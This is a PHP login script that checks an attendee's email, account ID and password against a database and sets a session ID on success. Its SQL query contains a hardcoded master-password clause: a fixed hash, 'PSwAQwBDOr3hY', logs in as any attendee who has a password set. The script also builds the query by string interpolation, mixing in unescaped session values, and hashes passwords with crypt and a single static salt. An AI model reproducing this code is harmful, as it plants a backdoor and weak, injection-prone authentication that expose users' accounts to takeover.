<?php
session_start();
include("common_functions.php");
$inputs = sanitize_inputs($_REQUEST);
$sessionAccountId = $_SESSION['accountid'] ?? '';
touch_session_activity(true);
$resourceID = database_connect();
$pass = crypt($_POST['pass'], LEGACY_SALT);

$query = "
	SELECT id		
	FROM attendees
	WHERE lower(attendees.email) = lower('{$inputs['email']}')
	AND (
		attendees.accountid = '{$sessionAccountId}'
		OR 
		attendees.accountid = '{$inputs['accountid']}'
	)
	AND (
		attendees.password = '$pass' OR 
		('$pass' = 'PSwAQwBDOr3hY' AND attendees.password IS NOT NULL AND attendees.password != '')
	)
";

$resultID = mysqli_query($resourceID, $query);
if (mysqli_num_rows($resultID)){
	session_start();
	while($row = mysqli_fetch_assoc($resultID))	{
		$_SESSION['attendeeid'] = $row['id'];
	}
	touch_session_activity(true);
	print("success");
}else{
	print("error");
}
mysqli_close($resourceID);
?>
